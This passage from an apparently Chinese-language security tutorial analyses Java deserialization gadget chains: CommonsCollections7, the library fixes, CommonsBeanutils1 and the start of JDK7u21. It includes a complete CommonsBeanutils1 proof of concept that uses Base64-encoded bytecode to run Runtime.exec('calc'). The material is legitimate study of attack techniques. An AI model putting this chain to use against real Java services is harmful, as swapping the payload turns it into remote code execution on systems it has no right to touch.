<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">equals:472, AbstractMap (java.util)</span><br><span class="line">equals:130, AbstractMapDecorator (org.apache.commons.collections.map)</span><br><span class="line">reconstitutionPut:1221, Hashtable (java.util)</span><br><span class="line">readObject:1195, Hashtable (java.util)</span><br><span class="line">...</span><br><span class="line">main:49, CommonsCollections7 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>Hashtable#put</code> 也会调用 <code>entry.key.equals</code> 方法导致利用链被触发一次，因此需要将调用 <code>LazyMap#get</code> 时加入的 <code>key</code> 去掉。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>Hashtable#put</code> 调用的 <code>entry.key.equals</code> 需要返回 <code>false</code> 才能把第二个键值对放入 <code>Hashtable</code>。在 <code>AbstraceMap#equals</code> 中，如果 <code>value</code> 为 <code>null</code> 的话只需要让 <code>m.get(key)</code> 返回不为 <code>null</code> 即可。而 <code>transformer</code> 方法返回不为 <code>null</code> 很容易满足。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h2><p>Apache Commons Collections 官方在 2015 年底得知序列化相关的问题后，就在两个分支上同时发布了新的版本 4.1 和 3.2.2。</p>
<p>3.2.2 版代码中增加了一个方法 <code>FunctorUtils#checkUnsafeSerialization</code>，用于检测反序列化是否安全。如果开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会抛出异常。</p>
<p>这个检查在常见的危险 <code>Transformer</code> 类（<code>InstantiateTransformer</code>、<code>InvokerTransformer</code>、<code>PrototypeFactory</code>、<code>CloneTransformer</code> 等）的 <code>readObject</code> 里进行调用。所以，当我们反序列化包含这些对象时就会抛出一个异常：</p>
<p><code>Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property &#39;org.apache.commons.collections.enableUnsafeSerialization&#39; to &#39;true&#39;, but you must ensure that your application does not de-serialize objects from untrusted sources.</code></p>
<p>在 4.1 版本，这几个危险 <code>Transformer</code> 类不再实现 <code>Serializable</code> 接口，也就是说，他们几个彻底无法序列化和反序列化了。</p>
<table>
<thead>
<tr>
<th align="left">CommonsCollections Gadget Chains</th>
<th align="left">CommonsCollection Version</th>
<th align="left">JDK Version</th>
<th align="left">Note</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CommonsCollections1</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections2</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections3</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections4</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections5</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.8 8u76（实测8u181也可）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections6</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections7</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h1><h2 id="CommonsBeanutils-概述"><a href="#CommonsBeanutils-概述" class="headerlink" title="CommonsBeanutils 概述"></a>CommonsBeanutils 概述</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为 JavaBean）的一些操作方法。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty，让使用者可以直接调用任意 JavaBean 的 getter 方法。例如下面这段代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">        PropertyUtils.setProperty(bean, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(bean, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在执行 <code>PropertyUtils.getProperty(bean, &quot;name&quot;)</code> 时，commons-beanutils 会自动找到 <code>name</code> 属性的 getter 方法，也就是 getName，然后调用，获得返回值。</p>
<p>除此之外， <code>PropertyUtils.getProperty</code> 还支持递归获取属性，比如 <code>a</code> 对象中有属性 <code>b</code>，<code>b</code> 对象中有属性 <code>c</code>，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取。</p>
<p>通过这个方法，使用者可以很方便地调用任意对象的 getter，适用于在不确定 JavaBean 是哪个类对象时使用。</p>
<p>当然，commons-beanutils 中诸如此类的辅助方法还有很多，如调用 setter、拷贝属性等，这里不再细说。</p>
<h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><p>commons-beanutils 的 <code>org.apache.commons.beanutils.BeanComparator</code> 实现了 <code>java.util</code> 接口，它的 <code>compare</code> 方法会对待比较对象调用 <code>PropertyUtils.getProperty</code> 方法获取 <code>property</code> 属性。而 <code>TemplatesImpl#getOutputProperties</code> 可以触发字节码加载。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> comparator.compare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们可以借鉴 CC2 的思路在 <code>PriorityQueue</code> 中放两个 <code>TemplatesImpl</code> 并且设置 <code>BeanComparator</code> 为 <code>PriorityQueue</code> 的比较方式。此时如果我们设置 <code>BeanComparator</code> 的 <code>property</code> 属性为 <code>outputProperties</code> 则在反序列化触发 <code>BeanComparator#compare</code> 时会通过 <code>PropertyUtils.getProperty</code> 调用到 <code>TemplatesImpl#getOutputProperties</code> 进而实现任意字节码加载。</p>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">getProperty:426, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:157, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:38, CommonsBeanutils1 (com.example)</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意 <code>BeanComparator</code> 的构造方法有两个，如果没有指定 <code>Comparator</code> 默认会使用 <code>org.apache.commons.collections.comparators.ComparableComparator</code>。这样改利用链会依赖于 commons-collections 库。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">    setProperty( property );</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>为了避免这种依赖关系从而提高利用链的通用性，我们需要找到一个类来替换 <code>ComparableComparator</code>，它需要满足下面这几个条件：</p>
<ul>
<li>实现 <code>java.util.Comparator</code> 接口</li>
<li>实现 <code>java.io.Serializable</code> 接口</li>
<li>Java、shiro 或 commons-beanutils 自带，且兼容性强。</li>
</ul>
<p>实际上有很多类都满足这个条件，这里我选择的是 <code>CaseInsensitiveComparator</code>，可以通过 <code>String.CASE_INSENSITIVE_ORDER</code>  获取。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/105e5cae598e4a888081c4dcf0b3919e.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="原生反序列化利用链"><a href="#原生反序列化利用链" class="headerlink" title="原生反序列化利用链"></a>原生反序列化利用链</h1><p>主要是一些不依赖第三方库的 Java 反序列化利用链。</p>
<h2 id="JDK7u21"><a href="#JDK7u21" class="headerlink" title="JDK7u21"></a>JDK7u21</h2><p><code>AnnotationInvocationHandler</code> 类中的 <code>equalsImpl</code> 方法在参数 <code>Object o</code> 不是 <code>AnnotationInvocationHandler</code> 的实现类代理的对象时会获取 <code>AnnotationInvocationHandler#type</code> 中的所有方法，然后依次调用 <code>o</code> 中的这些方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AnnotationInvocationHandler <span class="title function_">asOneOfUs</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Proxy.isProxyClass(o.getClass())) &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Proxy.getInvocationHandler(o);</span><br><span class="line">        <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> AnnotationInvocationHandler)</span><br><span class="line">            <span class="keyword">return</span> (AnnotationInvocationHandler) handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        memberMethods = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    <span class="keyword">final</span> Method[] mm = type.getDeclaredMethods();</span><br><span class="line">                    validateAnnotationMethods(mm);</span><br><span class="line">                    AccessibleObject.setAccessible(mm, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> mm;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memberMethods;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> memberMethod.getName();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ourValue</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">hisValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">AnnotationInvocationHandler</span> <span class="variable">hisHandler</span> <span class="operator">=</span> asOneOfUs(o);</span><br><span class="line">        <span class="keyword">if</span> (hisHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                hisValue = memberMethod.invoke(o); <span class="comment">// 调用 o 的所有方法</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们不难想到如果构造一个 <code>AnnotationInvocationHandler</code> 使得其 <code>type</code> 为 <code>Templates.class</code> 然后将 <code>TemplatesImpl</code> 对象传入便会调用它的 <code>getOutputProperties</code> 方法实现恶意字节码加载。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

